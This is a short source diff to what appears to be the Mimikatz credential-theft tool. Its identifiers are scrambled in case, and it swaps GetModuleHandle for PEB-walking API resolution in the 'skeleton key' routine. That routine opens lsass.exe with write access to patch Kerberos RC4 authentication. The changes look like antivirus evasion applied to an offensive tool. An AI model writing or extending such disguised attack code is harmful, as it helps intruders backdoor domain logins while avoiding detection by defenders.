@@ -4,6 +4,7 @@
 	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
 */
 #include "kuhl_m_mIsC.h"
+#include "..\mimilib\api_resolver.h"
 
 const KUHL_M_C kuhl_m_c_mIsC[] = {
 	{kuhl_m_mIsC_cmd,		L"cmd",			L"Command Prompt          (without DisableCMD)"},
@@ -680,6 +681,10 @@ NTSTATUS kuhl_m_mIsC_sKeLeToN(int argc, wchar_t * argv[])
 	BOOL onlyRC4Stuff = (NoTKaZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_VISTA) || kull_m_string_args_byName(argc, argv, L"letaes", NULL, NULL);
 	RtlZeroMemory(&orig, sizeof(orig));
 	RtlInitUnicodeString(&orig, newerKey);
+
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"cryptdll.dll");
+
+
 	if(kull_m_ProCeSs_getProcessIdForName(L"lsass.exe", &ProCeSsId))
 	{
 		if(hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ProCeSsId))
@@ -717,7 +722,8 @@ NTSTATUS kuhl_m_mIsC_sKeLeToN(int argc, wchar_t * argv[])
 				{
 					if(kull_m_ProCeSs_getVeryBasicModuleInformationsForName(aLsass.hMemory, L"cryptdll.dll", &cryptInfos))
 					{
-						localAddr = (PBYTE) GetModuleHandle(L"cryptdll.dll");
+						//localAddr = (PBYTE) GetModuleHandle(L"cryptdll.dll");
+						localAddr = (PBYTE) hKernel32Base;
 						if(NT_SUCCESS(CDLocateCSystem(KERB_ETYPE_RC4_HMAC_NT, &pCrypt)))
 						{
 							extensions[3].Pointer = (PBYTE) cryptInfos.DllBase.address + ((PBYTE) pCrypt->Initialize - localAddr);
@@ -1047,6 +1053,7 @@ NTSTATUS kuhl_m_mIsC_clip(int argc, wchar_t * argv[])
 	MSG msg;
 	BOOL bRet;
 	HINSTANCE hInstance = GetModuleHandle(NULL);
+	//HMODULE hKernel32Base = GetModuleBaseFromPEB(NULL);
 
 	RtlZeroMemory(&myClass, sizeof(WNDCLASSEX));
 	myClass.cbSize = sizeof(WNDCLASSEX);
